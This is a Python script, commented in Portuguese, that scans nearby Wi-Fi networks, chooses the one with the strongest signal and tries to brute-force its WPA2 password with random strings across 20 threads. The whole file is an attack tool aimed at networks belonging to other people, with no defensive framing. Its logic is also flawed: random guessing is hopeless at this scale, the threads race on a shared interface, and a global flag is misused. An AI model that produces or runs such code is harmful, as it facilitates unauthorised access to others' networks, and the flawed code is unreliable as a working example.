import pywifi
from pywifi import const
import time
import random
import string
import threading

# Verificar se o adaptador Wi-Fi está disponível
try:
    wifi = pywifi.PyWiFi()
    if len(wifi.interfaces()) == 0:
        print("Nenhum adaptador Wi-Fi encontrado!")
        exit()
    iface = wifi.interfaces()[0]
    iface.disconnect()
except Exception as e:
    print("Erro ao encontrar o adaptador Wi-Fi: ", e)
    exit()

# Escanear as redes Wi-Fi próximas
try:
    iface.scan()
    time.sleep(5) # Aguarda 5 segundos para os resultados do scan serem atualizados
    results = iface.scan_results()
    if len(results) == 0:
        print("Nenhuma rede Wi-Fi encontrada!")
        exit()

    # Selecionar a rede com o sinal mais forte
    results.sort(key=lambda x: x.signal, reverse=True)
    ssid = results[0].ssid # Seleciona o SSID da rede com o sinal mais forte
    print(f"SSID encontrado: {ssid}")
except Exception as e:
    print("Erro ao escanear as redes Wi-Fi: ", e)
    exit()

# Conectar à rede Wi-Fi
try:
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    iface_profiles = iface.network_profiles()
    if any(profile.ssid == p.ssid for p in iface_profiles):
        print("Já existe um perfil para esta rede!")
    else:
        print("Conectando à rede Wi-Fi...")
        connected = False
        def connect_thread(passwords):
            global connected
            for password in passwords:
                if connected:
                    break
                profile.key = password
                tmp_profile = iface.add_network_profile(profile)
                iface.connect(tmp_profile)
                time.sleep(5) # Aguarda 5 segundos para tentar conectar
                if iface.status() == const.IFACE_CONNECTED:
                    print("Senha correta: ", password)
                    connected = True
                    break
                else:
                    print("Senha incorreta: ", password)
                    iface.remove_network_profile(tmp_profile)

        # Gerar senhas aleatórias e testar até conectar
        def generate_password():
            """Gera uma senha aleatória com um tamanho entre 8 e 16."""
            length = random.randint(8, 16)
            chars = string.ascii_letters + string.digits + string.punctuation
            password = ''.join(random.choice(chars) for _ in range(length))
            return password

        threads = []
        for i in range(0, 20): # Usa 20 threads para testar senhas
            t = threading.Thread(target=connect_thread, args=([generate_password() for _ in range(100000)],))
            threads.append(t)
            t.start()
except Exception as e:
    print("Erro ao conectar à rede Wi-Fi: ", e)
    exit()
